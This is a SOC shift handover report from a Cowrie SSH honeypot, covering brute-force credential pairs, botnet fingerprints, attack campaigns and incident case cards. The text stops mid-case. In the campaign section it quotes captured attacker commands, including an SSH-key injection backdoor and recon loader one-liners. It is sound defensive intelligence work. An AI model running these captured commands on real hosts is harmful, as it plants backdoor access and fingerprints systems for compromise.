# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-26 |
| **Generated At** | 2026-07-26T13:38:26Z |
| **Shift Time** | 13:38 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **267** |
| Confirmed Threats | **231** |
| False Positives Filtered | **36** (13.5%) |
| Unique Attacker IPs | **132** |
| Countries of Origin | **33** |
| High Severity Cases | **158** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **109** |
| Malware Samples Analyzed | **4** HIGH · **31** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **200** |
| Unique Credential Pairs | **116** |
| Unique Usernames | **52** |
| Unique Passwords | **106** |
| Successful Auth Pairs | **173** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 51 |
| `guest` | 20 |
| `support` | 15 |
| `admin` | 14 |
| `config` | 11 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 12 |
| `admin` | 8 |
| `66666` | 7 |
| `root` | 6 |
| `345gs5662d34` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 12 |
| `admin` | `admin` | 7 |
| `345gs5662d34` | `345gs5662d34` | 6 |
| `config` | `77` | 6 |
| `test` | `test44` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `mysql` | `root` | `220.161.52.149` | 2026-07-26T08:59:50 |
| `mysql` | `root` | `14.99.61.248` | 2026-07-26T08:59:58 |
| `mysql` | `root` | `10.0.0.73` | 2026-07-26T09:03:26 |
| `ubuntu` | `123654` | `176.36.139.231` | 2026-07-26T09:07:03 |
| `ubuntu` | `123654` | `10.0.0.73` | 2026-07-26T09:07:27 |
| `blank` | `222222` | `46.201.247.21` | 2026-07-26T09:08:12 |
| `blank` | `222222` | `61.37.150.6` | 2026-07-26T09:11:42 |
| `root` | `﻿------fuck------` | `219.144.80.143` | 2026-07-26T09:20:43 |
| `root` | `111111` | `2.57.122.168` | 2026-07-26T09:21:14 |
| `root` | `123` | `2.57.122.168` | 2026-07-26T09:24:09 |
| `root` | `123123` | `2.57.122.168` | 2026-07-26T09:26:54 |
| `ubuntu` | `dietpi` | `223.223.194.187` | 2026-07-26T09:27:43 |
| `ubuntu` | `dietpi` | `34.146.248.7` | 2026-07-26T09:27:56 |
| `ubuntu` | `dietpi` | `10.0.0.73` | 2026-07-26T09:28:11 |
| `config` | `999` | `41.60.23.246` | 2026-07-26T09:28:22 |
| `config` | `999` | `223.210.27.53` | 2026-07-26T09:28:30 |
| `root` | `123321` | `2.57.122.168` | 2026-07-26T09:29:36 |
| `config` | `999` | `120.234.232.184` | 2026-07-26T09:31:45 |
| `config` | `999` | `186.215.107.189` | 2026-07-26T09:31:52 |
| `root` | `1234` | `2.57.122.168` | 2026-07-26T09:32:13 |
| `admin` | `admin` | `198.98.53.110` | 2026-07-26T09:33:16 |
| `root` | `12345` | `2.57.122.168` | 2026-07-26T09:34:42 |
| `guest` | `999999` | `10.0.0.73` | 2026-07-26T09:36:38 |
| `gg` | `wizard` | `91.92.47.53` | 2026-07-26T09:37:01 |
| `wetdryworld` | `a` | `91.92.47.53` | 2026-07-26T09:37:06 |
| `zhouxin` | `test1` | `91.92.47.53` | 2026-07-26T09:37:12 |
| `nikita` | `abcd@1234` | `91.92.47.53` | 2026-07-26T09:37:16 |
| `jetdocumentv_usr` | `odoo18` | `91.92.47.53` | 2026-07-26T09:37:21 |
| `akjmehdi` | `appuser` | `91.92.47.53` | 2026-07-26T09:37:26 |
| `hikemqtt` | `Huawei12` | `91.92.47.53` | 2026-07-26T09:37:31 |
| `elastic` | `q1w2e3r4` | `91.92.47.53` | 2026-07-26T09:37:36 |
| `s10deborah` | `qQ123456` | `91.92.47.53` | 2026-07-26T09:37:41 |
| `us4` | `mysql@1234` | `91.92.47.53` | 2026-07-26T09:37:45 |
| `sem6` | `bigdata` | `91.92.47.53` | 2026-07-26T09:37:50 |
| `iliagermansela` | `factorio` | `91.92.47.53` | 2026-07-26T09:37:55 |
| `s10george` | `zaq12wsx` | `91.92.47.53` | 2026-07-26T09:38:00 |
| `pey14` | `Huawei@123` | `91.92.47.53` | 2026-07-26T09:38:05 |
| `us24` | `runner` | `91.92.47.53` | 2026-07-26T09:38:10 |
| `pujie` | `mysql123` | `91.92.47.53` | 2026-07-26T09:38:14 |
| `s8daniyal` | `g` | `91.92.47.53` | 2026-07-26T09:38:19 |
| `rajadeepan` | `A123456a` | `91.92.47.53` | 2026-07-26T09:38:24 |
| `vncuser` | `debian` | `91.92.47.53` | 2026-07-26T09:38:29 |
| `test` | `Password1` | `91.92.47.53` | 2026-07-26T09:38:34 |
| `netdata` | `deployer` | `91.92.47.53` | 2026-07-26T09:38:39 |
| `super` | `Passw0rd` | `91.92.47.53` | 2026-07-26T09:38:44 |
| `5935` | `postgres123` | `91.92.47.53` | 2026-07-26T09:38:49 |
| `guies` | `Password@123` | `91.92.47.53` | 2026-07-26T09:38:54 |
| `lakshmi` | `amine` | `91.92.47.53` | 2026-07-26T09:38:59 |
| `bro` | `user1234` | `91.92.47.53` | 2026-07-26T09:39:04 |
| `5903` | `admin123456` | `91.92.47.53` | 2026-07-26T09:39:09 |
| `cheeki` | `claude` | `91.92.47.53` | 2026-07-26T09:39:14 |
| `us49` | `pi` | `91.92.47.53` | 2026-07-26T09:39:19 |
| `dirmngr` | `es123456` | `91.92.47.53` | 2026-07-26T09:39:24 |
| `s9marcelus` | `guest123` | `91.92.47.53` | 2026-07-26T09:39:29 |
| `root` | `1234567` | `2.57.122.168` | 2026-07-26T09:39:35 |
| `root` | `12345678` | `2.57.122.168` | 2026-07-26T09:42:06 |
| `root` | `123456789` | `2.57.122.168` | 2026-07-26T09:44:57 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-26T09:45:13 |
| `root` | `1234abcd` | `2.57.122.168` | 2026-07-26T09:47:53 |
| `support` | `support` | `176.53.159.196` | 2026-07-26T09:50:45 |
| `root` | `123abc` | `2.57.122.168` | 2026-07-26T09:51:22 |
| `support` | `support` | `10.0.0.73` | 2026-07-26T09:52:04 |
| `admin` | `admin` | `47.77.182.54` | 2026-07-26T09:53:04 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-26T09:53:05 |
| `root` | `123qwe` | `2.57.122.168` | 2026-07-26T09:54:38 |
| `guest` | `2222222` | `189.52.52.162` | 2026-07-26T09:56:15 |
| `guest` | `2222222` | `125.20.207.154` | 2026-07-26T09:56:31 |
| `guest` | `2222222` | `10.0.0.73` | 2026-07-26T09:56:39 |
| `centos` | `444444` | `217.150.37.249` | 2026-07-26T09:57:32 |
| `root` | `1q2w3e` | `2.57.122.168` | 2026-07-26T09:57:37 |
| `centos` | `444444` | `188.36.7.196` | 2026-07-26T09:57:40 |
| `root` | `1q2w3e4r` | `2.57.122.168` | 2026-07-26T10:00:41 |
| `centos` | `444444` | `10.0.0.73` | 2026-07-26T10:01:22 |
| `deploy` | `111111` | `98.70.127.17` | 2026-07-26T10:03:11 |
| `345gs5662d34` | `345gs5662d34` | `98.70.127.17` | 2026-07-26T10:03:15 |
| `deploy` | `3245gs5662d34` | `98.70.127.17` | 2026-07-26T10:03:17 |
| `root` | `1qaz2wsx` | `2.57.122.168` | 2026-07-26T10:03:43 |
| `root` | `zaq` | `69.229.227.44` | 2026-07-26T10:06:13 |
| `345gs5662d34` | `345gs5662d34` | `69.229.227.44` | 2026-07-26T10:06:14 |
| `root` | `3245gs5662d34` | `69.229.227.44` | 2026-07-26T10:06:14 |
| `root` | `654321` | `2.57.122.168` | 2026-07-26T10:06:51 |
| `root` | `P@ssw0rd` | `2.57.122.168` | 2026-07-26T10:09:54 |
| `root` | `P@ssword` | `2.57.122.168` | 2026-07-26T10:13:01 |
| `test` | `000000` | `208.109.38.143` | 2026-07-26T10:13:41 |
| `root` | `Root123` | `2.57.122.168` | 2026-07-26T10:16:08 |
| `administrator` | `marketing` | `46.210.94.61` | 2026-07-26T10:17:27 |
| `administrator` | `marketing` | `124.152.90.68` | 2026-07-26T10:17:40 |
| `root` | `admin` | `2.57.122.168` | 2026-07-26T10:19:23 |
| `administrator` | `marketing` | `10.0.0.73` | 2026-07-26T10:21:23 |
| `root` | `admin123` | `2.57.122.168` | 2026-07-26T10:22:09 |
| `user` | `8` | `101.13.5.26` | 2026-07-26T10:22:18 |
| `user` | `8` | `211.253.10.61` | 2026-07-26T10:22:27 |
| `root` | `letmein` | `2.57.122.168` | 2026-07-26T10:25:05 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-26T10:27:48 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-26T10:27:48 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-26T10:27:51 |
| `root` | `passw0rd` | `2.57.122.168` | 2026-07-26T10:28:10 |
| `username` | `123321` | `103.250.11.156` | 2026-07-26T10:29:19 |
| `345gs5662d34` | `345gs5662d34` | `103.250.11.156` | 2026-07-26T10:29:23 |
| `username` | `3245gs5662d34` | `103.250.11.156` | 2026-07-26T10:29:25 |
| `luis` | `changeme` | `180.113.57.10` | 2026-07-26T10:30:23 |
| `root` | `password` | `2.57.122.168` | 2026-07-26T10:31:11 |
| `root` | `password1` | `2.57.122.168` | 2026-07-26T10:34:18 |
| `root` | `qwerty` | `2.57.122.168` | 2026-07-26T10:37:25 |
| `root` | `r00t` | `2.57.122.168` | 2026-07-26T10:40:18 |
| `nobody` | `66666` | `61.145.163.164` | 2026-07-26T10:42:03 |
| `config` | `77` | `220.161.52.149` | 2026-07-26T10:42:15 |
| `config` | `77` | `116.114.94.242` | 2026-07-26T10:42:27 |
| `config` | `77` | `213.130.207.177` | 2026-07-26T10:45:27 |
| `config` | `77` | `218.21.243.58` | 2026-07-26T10:45:35 |
| `config` | `77` | `10.0.0.73` | 2026-07-26T10:45:48 |
| `guest` | `guest22` | `65.20.153.146` | 2026-07-26T10:46:48 |
| `guest` | `guest22` | `36.64.33.82` | 2026-07-26T10:46:57 |
| `root` | `root!@#` | `2.57.122.168` | 2026-07-26T10:49:22 |
| `guest` | `guest22` | `189.56.0.19` | 2026-07-26T10:50:11 |
| `guest` | `guest22` | `217.24.185.98` | 2026-07-26T10:50:25 |
| `root` | `root#123` | `2.57.122.168` | 2026-07-26T10:52:16 |
| `root` | `root0000` | `2.57.122.168` | 2026-07-26T10:55:05 |
| `root` | `root1111` | `2.57.122.168` | 2026-07-26T10:57:47 |
| `root` | `root123` | `2.57.122.168` | 2026-07-26T11:00:21 |
| `root` | `﻿------fuck------` | `111.36.57.69` | 2026-07-26T11:01:41 |
| `root` | `root1234` | `2.57.122.168` | 2026-07-26T11:02:48 |
| `guest` | `55555` | `175.198.18.3` | 2026-07-26T11:03:13 |
| `root` | `root2024` | `2.57.122.168` | 2026-07-26T11:05:20 |
| `23` | `root` | `94.154.43.140` | 2026-07-26T11:07:04 |
| `root` | `root2025` | `2.57.122.168` | 2026-07-26T11:07:49 |
| `ubnt` | `9999999` | `112.161.26.125` | 2026-07-26T11:10:10 |
| `test` | `test44` | `175.100.107.238` | 2026-07-26T11:11:33 |
| `test` | `test44` | `112.161.26.125` | 2026-07-26T11:11:41 |
| `test` | `test44` | `112.31.167.120` | 2026-07-26T11:14:57 |
| `root` | `iptv123` | `153.66.28.132` | 2026-07-26T11:15:00 |
| `345gs5662d34` | `345gs5662d34` | `153.66.28.132` | 2026-07-26T11:15:03 |
| `root` | `3245gs5662d34` | `153.66.28.132` | 2026-07-26T11:15:03 |
| `test` | `test44` | `24.142.170.231` | 2026-07-26T11:15:05 |
| `test` | `test44` | `10.0.0.73` | 2026-07-26T11:15:19 |
| `postgres` | `123321` | `187.126.105.42` | 2026-07-26T11:28:04 |
| `guest` | `666666` | `182.75.197.174` | 2026-07-26T11:31:29 |
| `postgres` | `123321` | `10.0.0.73` | 2026-07-26T11:31:52 |
| `admin` | `admin` | `47.253.5.130` | 2026-07-26T11:32:13 |
| `guest` | `666666` | `10.0.0.73` | 2026-07-26T11:35:04 |
| `pi` | `webadmin` | `107.135.117.245` | 2026-07-26T11:36:03 |
| `pi` | `webadmin` | `223.100.248.64` | 2026-07-26T11:36:13 |
| `pi` | `webadmin` | `189.52.52.162` | 2026-07-26T11:39:40 |
| `pi` | `webadmin` | `10.0.0.73` | 2026-07-26T11:40:01 |
| `test` | `asdfasdf` | `51.75.64.35` | 2026-07-26T11:42:06 |
| `345gs5662d34` | `345gs5662d34` | `51.75.64.35` | 2026-07-26T11:42:08 |
| `test` | `3245gs5662d34` | `51.75.64.35` | 2026-07-26T11:42:09 |
| `root` | `1234567890z` | `47.236.92.87` | 2026-07-26T11:42:22 |
| `345gs5662d34` | `345gs5662d34` | `47.236.92.87` | 2026-07-26T11:42:27 |
| `root` | `3245gs5662d34` | `47.236.92.87` | 2026-07-26T11:42:28 |
| `admin` | `hp.com` | `94.154.43.210` | 2026-07-26T11:46:14 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-26T11:51:58 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-26T11:51:58 |
| `guest` | `333` | `124.152.90.68` | 2026-07-26T11:56:04 |
| `guest` | `333` | `196.189.126.10` | 2026-07-26T11:59:24 |
| `guest` | `333` | `10.0.0.73` | 2026-07-26T11:59:51 |
| `centos` | `p@ssw0rd` | `112.31.93.229` | 2026-07-26T12:00:55 |
| `centos` | `p@ssw0rd` | `67.85.146.216` | 2026-07-26T12:04:18 |
| `centos` | `p@ssw0rd` | `10.0.0.73` | 2026-07-26T12:04:43 |
| `support` | `6666` | `103.31.38.92` | 2026-07-26T12:17:32 |
| `support` | `6666` | `10.0.0.73` | 2026-07-26T12:21:27 |
| `config` | `666` | `10.0.0.73` | 2026-07-26T12:24:40 |
| `administrator` | `passwd` | `10.0.0.73` | 2026-07-26T12:29:26 |
| `admin` | `66666` | `85.19.195.12` | 2026-07-26T12:42:31 |
| `admin` | `66666` | `96.1.40.151` | 2026-07-26T12:42:41 |
| `oracle` | `qwerty123` | `115.46.88.68` | 2026-07-26T12:45:38 |
| `admin` | `66666` | `1.212.225.99` | 2026-07-26T12:45:50 |
| `admin` | `66666` | `14.33.96.3` | 2026-07-26T12:46:02 |
| `admin` | `66666` | `10.0.0.73` | 2026-07-26T12:46:16 |
| `oracle` | `qwerty123` | `10.0.0.73` | 2026-07-26T12:49:33 |
| `guest` | `7` | `120.224.15.67` | 2026-07-26T12:50:27 |
| `guest` | `7` | `60.174.39.82` | 2026-07-26T12:50:37 |
| `guest` | `7` | `10.0.0.73` | 2026-07-26T12:54:21 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **267** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 82 |
| OpenSSH | 53 |
| libssh | 33 |
| Paramiko (Python) | 6 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 53 | 49 |
| `2ec37a7cc8da...` | Mirai/variant | 37 | 1 |
| `0a07365cc01f...` | Generic scanner | 32 | 2 |
| `f555226df196...` | Mirai/variant | 19 | 7 |
| `eff4c24daffc...` | Modern SSH client | 6 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 53 | 49 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 37 | 1 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 32 | 2 | Generic scanner |
| `f555226df196...` | libssh | 19 | 7 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 3 | — |
| `eff4c24daffc...` | Go SSH scanner | 6 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 2 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 35 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.168`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.210`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `47.236.92.87`, `153.66.28.132`, `98.70.127.17`, `103.250.11.156`, `51.75.64.35`, `69.229.227.44`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **132** |
| Unique ASNs | **76** |
| High-Risk ASNs | **66** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 12 | LOW |
| `AS22773` | Cox Communications Inc. | 9 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (155)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-37bc9803948c

| Field | Detail |
|---|---|
| **Source IP** | `220.161.52[.]149` |
| **First Seen** | 2026-07-26 08:59 |
| **Last Seen** | 2026-07-26 08:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:59:46` | `cowrie.session.connect` |
| `2026-07-26 08:59:47` | `cowrie.client.version` |
| `2026-07-26 08:59:47` | `cowrie.client.kex` |
| `2026-07-26 08:59:50` | `cowrie.login.success` |
| `2026-07-26 08:59:51` | `cowrie.direct-tcpip.request` |
| `2026-07-26 08:59:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.161.52[.]149` to AbuseIPDB if not already reported
- [ ] Block `220.161.52[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d551fd5a274d

| Field | Detail |
|---|---|
| **Source IP** | `14.99.61[.]248` |
| **First Seen** | 2026-07-26 08:59 |
| **Last Seen** | 2026-07-26 09:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:59:56` | `cowrie.session.connect` |
| `2026-07-26 08:59:56` | `cowrie.client.version` |
| `2026-07-26 08:59:56` | `cowrie.client.kex` |
| `2026-07-26 08:59:58` | `cowrie.login.success` |
| `2026-07-26 08:59:58` | `cowrie.direct-tcpip.request` |
| `2026-07-26 09:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.99.61[.]248` to AbuseIPDB if not already reported
- [ ] Block `14.99.61[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4f01e9d1c44

| Field | Detail |
|---|---|
| **Source IP** | `176.36.139[.]231` |
| **First Seen** | 2026-07-26 09:07 |
| **Last Seen** | 2026-07-26 09:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:07:01` | `cowrie.session.connect` |
| `2026-07-26 09:07:02` | `cowrie.client.version` |
| `2026-07-26 09:07:02` | `cowrie.client.kex` |
| `2026-07-26 09:07:03` | `cowrie.login.success` |
| `2026-07-26 09:07:04` | `cowrie.direct-tcpip.request` |
| `2026-07-26 09:07:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.36.139[.]231` to AbuseIPDB if not already reported
- [ ] Block `176.36.139[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2e568a03ef2

| Field | Detail |
|---|---|
| **Source IP** | `46.201.247[.]21` |
| **First Seen** | 2026-07-26 09:08 |
| **Last Seen** | 2026-07-26 09:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:08:11` | `cowrie.session.connect` |
| `2026-07-26 09:08:11` | `cowrie.client.version` |
| `2026-07-26 09:08:11` | `cowrie.client.kex` |
| `2026-07-26 09:08:12` | `cowrie.login.success` |
| `2026-07-26 09:08:12` | `cowrie.direct-tcpip.request` |
| `2026-07-26 09:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.201.247[.]21` to AbuseIPDB if not already reported
- [ ] Block `46.201.247[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32ab477bce09

| Field | Detail |
|---|---|
| **Source IP** | `61.37.150[.]6` |
| **First Seen** | 2026-07-26 09:11 |
| **Last Seen** | 2026-07-26 09:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:11:39` | `cowrie.session.connect` |
| `2026-07-26 09:11:40` | `cowrie.client.version` |
| `2026-07-26 09:11:40` | `cowrie.client.kex` |
| `2026-07-26 09:11:42` | `cowrie.login.success` |
| `2026-07-26 09:11:42` | `cowrie.direct-tcpip.request` |
| `2026-07-26 09:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.37.150[.]6` to AbuseIPDB if not already reported
- [ ] Block `61.37.150[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1306627cccaf

| Field | Detail |
|---|---|
| **Source IP** | `219.144.80[.]143` |
| **First Seen** | 2026-07-26 09:20 |
| **Last Seen** | 2026-07-26 09:20 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:20:29` | `cowrie.session.connect` |
| `2026-07-26 09:20:30` | `cowrie.client.version` |
| `2026-07-26 09:20:34` | `cowrie.client.kex` |
| `2026-07-26 09:20:43` | `cowrie.login.success` |
| `2026-07-26 09:20:49` | `cowrie.session.params` |
| `2026-07-26 09:20:49` | `cowrie.command.input` |
| `2026-07-26 09:20:51` | `cowrie.log.closed` |
| `2026-07-26 09:20:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.144.80[.]143` to AbuseIPDB if not already reported
- [ ] Block `219.144.80[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22eefb26e9d6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 09:21 |
| **Last Seen** | 2026-07-26 09:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:21:09` | `cowrie.session.connect` |
| `2026-07-26 09:21:10` | `cowrie.client.version` |
| `2026-07-26 09:21:10` | `cowrie.client.kex` |
| `2026-07-26 09:21:14` | `cowrie.login.success` |
| `2026-07-26 09:21:16` | `cowrie.session.params` |
| `2026-07-26 09:21:16` | `cowrie.command.input` |
| `2026-07-26 09:21:16` | `cowrie.command.input` |
| `2026-07-26 09:21:16` | `cowrie.command.input` |
| `2026-07-26 09:21:16` | `cowrie.command.input` |
| `2026-07-26 09:21:16` | `cowrie.command.input` |
| `2026-07-26 09:21:16` | `cowrie.command.success` |
| `2026-07-26 09:21:16` | `cowrie.command.input` |
| `2026-07-26 09:21:16` | `cowrie.command.input` |
| `2026-07-26 09:21:16` | `cowrie.command.input` |
| `2026-07-26 09:21:16` | `cowrie.command.input` |
| `2026-07-26 09:21:17` | `cowrie.log.closed` |
| `2026-07-26 09:21:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c91c978e8e48
